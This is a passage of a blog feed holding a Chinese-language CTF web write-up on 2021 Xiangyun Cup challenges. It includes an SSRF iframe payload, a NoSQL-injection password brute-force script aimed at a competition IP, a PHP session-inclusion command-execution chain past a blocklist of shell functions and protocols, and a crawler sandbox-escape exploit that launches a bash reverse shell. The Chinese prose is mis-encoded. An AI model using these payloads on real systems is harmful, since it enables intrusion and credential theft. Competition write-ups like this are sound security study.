ğŸ¤¬&#x27;</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;utf8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Create your own pdfs&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;<span class="subst">$&#123;content&#125;</span>&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        `</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> filename = <span class="string">`<span class="subst">$&#123;uuid()&#125;</span>.pdf`</span></span><br><span class="line">            pdf.create(template, &#123;</span><br><span class="line">                <span class="string">&quot;format&quot;</span>: <span class="string">&quot;Letter&quot;</span>,</span><br><span class="line">                <span class="string">&quot;orientation&quot;</span>: <span class="string">&quot;portrait&quot;</span>,</span><br><span class="line">                <span class="string">&quot;border&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;pdf&quot;</span>,</span><br><span class="line">                <span class="string">&quot;renderDelay&quot;</span>: <span class="number">3000</span>,</span><br><span class="line">                <span class="string">&quot;timeout&quot;</span>: <span class="number">5000</span></span><br><span class="line">            &#125;).toFile(<span class="string">`./files/<span class="subst">$&#123;filename&#125;</span>`</span>, <span class="keyword">async</span> (err, _) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) next(createError(<span class="number">500</span>));</span><br><span class="line">                <span class="keyword">const</span> checksum = <span class="keyword">await</span> getCheckSum(filename);</span><br><span class="line">                <span class="built_in">console</span>.log(checksum)</span><br><span class="line">                <span class="keyword">await</span> DB.Create(<span class="string">&#x27;superuser&#x27;</span>, filename, checksum)</span><br><span class="line">                <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">message</span> : <span class="string">`Your pdf is successfully saved ğŸ¤‘ You know how to download it right?`</span>&#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">error</span> : <span class="string">&#x27;Failed to generate pdf ğŸ˜¥&#x27;</span>&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/api/files&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.socket.remoteAddress.replace(<span class="regexp">/^.*:/</span>, <span class="string">&#x27;&#x27;</span>) != <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> next(createError(<span class="number">401</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> &#123; username , filename, checksum &#125; = req.query;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span>(username) == <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(filename) == <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(checksum) == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> DB.Create(username, filename, checksum)</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Done&#x27;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Error!&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">&#x27;Parameters error&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/api/files/:id&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> token = req.signedCookies[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> (token &amp;&amp; token[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (token.username == <span class="string">&#x27;superuser&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Superuser is disabled now&#x27;</span>);   </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> filename = <span class="keyword">await</span> DB.getFile(token.username, req.params.id)</span><br><span class="line">            <span class="keyword">if</span> (fs.existsSync(path.join(__dirname , <span class="string">&quot;../files/&quot;</span>, filename)))&#123;</span><br><span class="line">                <span class="keyword">return</span> res.send(<span class="keyword">await</span> readFile(path.join(__dirname , <span class="string">&quot;../files/&quot;</span>, filename)));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> res.send(<span class="string">&#x27;No such file!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Error!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹çœ‹è¿™ä¸‰ä¸ªè·¯ç”±åˆ†åˆ«æœ‰ä»€ä¹ˆç”¨</p><p>/adminè·¯ç”±å¯ä»¥è‡ªå·±è¾“å…¥å†…å®¹ï¼Œç„¶åç”¨HTMLè½¬PDFæ¸²æŸ“ä¸€ä¸ªPDFå‡ºæ¥ï¼Œè¿‡æ»¤ä¸¥æ ¼ï¼Œæ²¡å‘åŠ ä¸Šæ ‡ç­¾ï¼Œè€Œ/api/filesè·¯ç”±åˆ™å¿…é¡»æœ¬åœ°è®¿é—®ï¼Œå¯ä»¥æ·»åŠ è®°å½•ä¸”æ‰€æœ‰å‚æ•°éƒ½å¯æ§ï¼Œæœ€å/api/files/:idè·¯ç”±åˆ™é€šè¿‡checkSumæ¥è¯»æ–‡ä»¶ã€‚</p><p>ç¬¬ä¸€ä¸ªå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œä»è€Œå¯ä»¥ä½¿ç”¨[]ç»•è¿‡</p><p>æ¥ä¸‹æ¥åˆ©ç”¨ç¬¬äºŒä¸ªè·¯ç”±è¿›è¡Œssrf</p><p>æœ€åé€šè¿‡ç¬¬ä¸‰ä¸ªè·¯ç”±è¯»å–</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=/flag&amp;checksum=ä»»æ„&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><h1 id="PackageManager2021"><a href="#PackageManager2021" class="headerlink" title="PackageManager2021"></a>PackageManager2021</h1><p>index.tsé‡Œæœ‰ä¸ªæ³¨å…¥ç‚¹</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> docs = <span class="keyword">await</span> User.$where(<span class="string">`this.username == &quot;admin&quot; &amp;&amp; hex_md5(this.password) == &quot;bfc31e7c22340f30e5b15badc0cafead&quot; || this.password[&#x27;+str(i)+&#x27;] == &quot;&#x27;+chr(x)+&#x27;&quot; &amp;&amp; this.username == &quot;admin&quot;`</span>).exec()</span><br></pre></td></tr></table></figure><p>å®³ï¼Œè¿˜æ˜¯å¤ªèœäº†ï¼Œå¯¹nosqlæ³¨å…¥äº†è§£ä¸å¤šï¼Œä¸€ç›´åœ¨æƒ³æ€ä¹ˆxssäº†ï¼Œæœ‰ç©ºå¥½å¥½å­¦ä¹ ä¸€ä¸‹nosqlæ³¨å…¥ï¼ˆtodo++</p><p>payload</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bfc31e7c22340f30e5b15badc0cafead<span class="string">&quot; || this.password[&#x27;+str(i)+&#x27;] == &quot;</span><span class="string">&#x27;+chr(x)+&#x27;</span><span class="string">&quot; &amp;&amp; this.username == &quot;</span>admin</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥ä¸€ä½ä½çš„æ‹¿åˆ°å¯†ç ï¼Œæ‹¿åˆ°å¯†ç ä¹‹åç™»å½•ä¸Šå»å°±å¯ä»¥çœ‹åˆ°flagäº†</p><p>æ¥è‡ª<a href="https://cn-sec.com/archives/470638.html">https://cn-sec.com/archives/470638.html</a>çš„expè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        burp0_url = <span class="string">&quot;http://47.104.108.80:8888/auth&quot;</span></span><br><span class="line">        burp0_cookies = &#123;<span class="string">&quot;session&quot;</span>: <span class="string">&quot;s%3A48cl_lUReimQytHn7toEfeafbGGIpWXB.YBzs%2B3EcrGrFNvfOoe0wEbmm2NSA%2B4tVAlsYy7eRoIE&quot;</span>&#125;</span><br><span class="line">        burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://47.104.108.80:8888&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://47.104.108.80:8888/auth&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">        burp0_data = &#123;<span class="string">&quot;_csrf&quot;</span>: <span class="string">&quot;kATaxQjv-Uka6Hw6X85iWgBuhyTxqgy7pvVA&quot;</span>, <span class="string">&quot;token&quot;</span>: <span class="string">&quot;cf87efe0c36a12aec113cd7982043573&quot;</span>||(this.username==<span class="string">&quot;admin&quot;</span>&amp;&amp;this.password[&#123;&#125;]==<span class="string">&quot;&#123;&#125;&quot;</span>)||<span class="string">&quot;&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">chr</span>(j))&#125;</span><br><span class="line">        res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">302</span>:</span><br><span class="line">            passwd += <span class="built_in">chr</span>(j)</span><br><span class="line">            print(passwd)</span><br></pre></td></tr></table></figure><h1 id="å®‰å…¨æ£€æµ‹"><a href="#å®‰å…¨æ£€æµ‹" class="headerlink" title="å®‰å…¨æ£€æµ‹"></a>å®‰å…¨æ£€æµ‹</h1><p>åå°å¯ä»¥å¡«urlï¼Œæ˜æ˜¾æ˜¯ssrfï¼Œå¦‚æœæ„é€ æŠ¥é”™ï¼Œé‚£åœ¨è¿”å›ä¸­ä¼šæœ‰file_get_contentså‡ºç°</p><p>ç¬¬ä¸€ååº”è‚¯å®šæ˜¯è¯•è¯•ä¼ªåè®®ï¼Œfilterè¿™äº›è¢«è¿‡æ»¤äº†</p><p>æ²¡å•¥æ€è·¯ï¼Œäºæ˜¯æ¯”èµ›æ—¶å°±åˆ°æ­¤ä¸ºæ­¢äº†ï¼Œèµ›åçœ‹wpæ‰çŸ¥é“æœ‰ä¸ªadminç›®å½•ï¼ˆåˆå¿˜è®°æ‰«ç›®å½•äº†</p><p>é‡Œé¢æœ‰ä¸ªinclude123.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;\/\*|\*|\.\.\/|\.\/|load_file|outfile|dumpfile|sub|hex|where&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .= <span class="string">&quot;|file_put_content|file_get_content|fwrite|curl|system|eval|assert&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|`|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec|http|.php|.ph|.log|\@|:\/\/|flag|access|error|stdout|stderr&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|file|dict|gopher&quot;</span>;</span><br><span class="line"><span class="comment">//ç´¯äº†ç´¯äº†ï¼Œé¥®èŒ¶å…ˆ</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$vpattern</span> = explode(<span class="string">&quot;|&quot;</span>,<span class="variable">$pattern</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$vpattern</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;    </span><br><span class="line">    <span class="keyword">if</span> (preg_match( <span class="string">&quot;/<span class="subst">$value</span>/i&quot;</span>, <span class="variable">$u</span> ))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æ£€æµ‹åˆ°æ¶æ„å­—ç¬¦&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$u</span>);</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªè¿‡æ»¤ä¸‹æ— æ³•åŒ…å«vpsä¹Ÿæ— æ³•é€šè¿‡æ—¥å¿—</p><p>äºæ˜¯å°±åªèƒ½è¯•è¯•sessionäº†</p><p>äºæ˜¯æˆåŠŸæ‰§è¡Œå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url1=http:<span class="comment">//127.0.0.1/admin/include123.php?u=/tmp/sess_aed2613cf894023354f4f332c67e9f2d%26fxz=<span class="meta">&lt;?=</span>phpinfo();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>çœ‹ç›®å½•ä¸‹å†…å®¹ç©ºæ ¼ç”¨%09</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url1=http:<span class="comment">//127.0.0.1/admin/include123.php?u=/tmp/sess_aed2613cf894023354f4f332c67e9f2d%26fxz=<span class="meta">&lt;?=</span>`ls%09/`;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>flagè¢«è¿‡æ»¤äº†åˆ©ç”¨?æˆ–è€…*å•¥çš„è¿‡æ»¤ä¸€ä¸‹å°±å¯ä»¥äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url1=http:<span class="comment">//127.0.0.1/admin/include123.php?u=/tmp/sess_aed2613cf894023354f4f332c67e9f2d%26fxz=<span class="meta">&lt;?=</span>`.%09/getfl?g.sh`;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h1 id="crawler-z"><a href="#crawler-z" class="headerlink" title="crawler_z"></a>crawler_z</h1><p>è¿™é¢˜å½“æ—¶å®Œå…¨æ²¡æ€è·¯ï¼Œåªèƒ½èµ›åçœ‹çœ‹å¤§å¸ˆå‚…ä»¬æ˜¯æ€ä¹ˆåšçš„</p><p>ä¸»è¦åŠŸèƒ½åœ¨user.js</p><p>åŠŸèƒ½å°±æ˜¯ç”¨æˆ·å¯ä»¥è¾“å…¥ä¸€ä¸ªç½‘å€ï¼Œç„¶åé€šè¿‡éªŒè¯çˆ¬è™«å°±ä¼šå»çˆ¬é‚£ä¸ªç½‘å€</p><p>å®ç°çˆ¬è™«åŠŸèƒ½çš„æ˜¯ä¸€ä¸ªå«zombieçš„åº“</p><p>ç„¶åå‚è€ƒ<a href="https://ha.cker.in/index.php/Article/13563">https://ha.cker.in/index.php/Article/13563</a>æ¥è¿›è¡Œæ¼æ´åˆ©ç”¨</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (url.protocol != <span class="string">&quot;http:&quot;</span> &amp;&amp; url.protocol != <span class="string">&quot;https:&quot;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (url.href.includes(<span class="string">&#x27;oss-cn-beijing.ichunqiu.com&#x27;</span>) === <span class="literal">false</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>checkBucketå‡½æ•°ä¸‹ï¼Œçœ‹åˆ°bucketçš„è¦æ±‚ï¼Œå¿…é¡»ä»¥http:æˆ–è€…https:ä¸ºå¼€å¤´ï¼Œä¸”å¿…é¡»åŒ…å«oss-cn-beijing.ichunqiu.com</p><p>ç„¶åè¿˜å¾—è¿‡</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="regexp">/^https:\/\/[a-f0-9]&#123;32&#125;\.oss-cn-beijing\.ichunqiu\.com\/$/</span>.exec(bucket)) &#123;</span><br><span class="line">    res.redirect(<span class="string">`/user/verify?token=<span class="subst">$&#123;authToken&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯å®Œæ•´çš„verifyè·¯ç”±</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/verify&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; token &#125; = req.query;</span><br><span class="line">    <span class="keyword">if</span> (!token || <span class="keyword">typeof</span> (token) !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">&quot;Parameters error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">    <span class="keyword">const</span> result = <span class="keyword">await</span> Token.findOne(&#123;</span><br><span class="line">        token,</span><br><span class="line">        userId: req.session.userId,</span><br><span class="line">        valid: <span class="literal">true</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> Token.update(&#123;</span><br><span class="line">                valid: <span class="literal">false</span></span><br><span class="line">            &#125;, &#123;</span><br><span class="line">                where: &#123; <span class="attr">userId</span>: req.session.userId &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">await</span> User.update(&#123;</span><br><span class="line">                bucket: user.personalBucket</span><br><span class="line">            &#125;, &#123;</span><br><span class="line">                where: &#123; <span class="attr">userId</span>: req.session.userId &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">            <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; user, <span class="attr">message</span>: <span class="string">&quot;Successfully update your bucket from personal bucket!&quot;</span> &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            next(createError(<span class="number">500</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; user, <span class="attr">message</span>: <span class="string">&quot;Failed to update, check your token carefully&quot;</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚æ„æ€æ˜¯è¾“å…¥ä¸€ä¸ªæ­£ç¡®çš„tokenï¼Œå°±ä¼šæŠŠç”¨æˆ·çš„personalBucketæ”¾åˆ°bucketé‡Œé¢ï¼Œå°±å¯ä»¥è®©çˆ¬è™«å»è®¿é—®äº†</p><p>æ€è·¯ä¸ºæŠŠbucketè®¾ç½®ä¸ºæˆ‘ä»¬è‡ªå·±çš„vps</p><p>ç„¶ååœ¨æˆ‘ä»¬çš„vpsä¸Šæ”¾ç½®ä¸€ä¸ªoss-cn-beijing.ichunqiu.com.htmlæ¶æ„æ–‡ä»¶</p><p>ä¿®æ”¹bucketä¸º<a href="http://ip/oss-cn-beijing.ichunqiu.com.html">http://ip/oss-cn-beijing.ichunqiu.com.html</a></p><p>æœ€åé€šè¿‡è€Œå·²æ–‡ä»¶æ¥åå¼¹shell</p><p>exp</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> codeToExec = <span class="string">&quot;var sync=require(&#x27;child_process&#x27;).spawnSync; &quot;</span> +</span><br><span class="line">    <span class="string">&quot;var ls = sync(&#x27;bash&#x27;, [&#x27;-c&#x27;, &#x27;bash -i .......&#x27;]); console.log(ls.output.toString());&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> exploit = <span class="string">&quot;c=&#x27;constructor&#x27;;require=this[c][c](&#x27;return process&#x27;)().mainModule.require;&quot;</span> + codeToExec;</span><br><span class="line"><span class="keyword">var</span> attackVector = <span class="string">&quot;c=&#x27;constructor&#x27;;this[c][c](\&quot;&quot;</span> + exploit + <span class="string">&quot;\&quot;)()&quot;</span>;</span><br><span class="line"><span class="comment">// end exploit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/test&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.send(<span class="string">&quot;&lt;script&gt;&quot;</span> + attackVector + <span class="string">&quot;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€é“æ˜¯javaçš„ï¼Œå› ä¸ºä¸ä¼šjavaï¼Œjavaæ°´å¹³åœç•™åœ¨åº”ä»˜è€ƒè¯•ï¼ˆå¤ªèœäº†ï¼‰ï¼Œæ‰€ä»¥å…ˆæ‘†çƒ‚äº†</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2021ç¥¥äº‘æ¯-web-wp&quot;&gt;&lt;a href=&quot;#2021ç¥¥äº‘æ¯-web-wp&quot; class=&quot;headerlink&quot; title=&quot;2021ç¥¥äº‘æ¯_web_wp&quot;&gt;&lt;/a&gt;2021ç¥¥äº‘æ¯_web_wp&lt;/h1&gt;&lt;p&gt;æ¯”èµ›çš„wpä»¥åŠèµ›åå¤ç°ï¼Œè¿™æ¬¡æ¯”èµ›æ€»çš„èµ›é¢˜ä¹Ÿæ›´</summary>
      
    
    
    
    <category term="ctf" scheme="http://www.fxizenta.design/categories/ctf/"/>
    
    <category term="web" scheme="http://www.fxizenta.design/categories/ctf/web/"/>
    
    
    <category term="wp" scheme="http://www.fxizenta.design/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadminçš„å‡ ä¸ªæ¼æ´å¤ç°</title>
    <link href="http://www.fxizenta.design/2021/08/13/phpmyadmin/"/>
    <id>http://www.fxizenta.design/2021/08/13/phpmyadmin/</id>
    <published>2021-08-13T15:26:54.000Z</published>
    <updated>2021-08-13T15:50:23.926Z</updated>
    
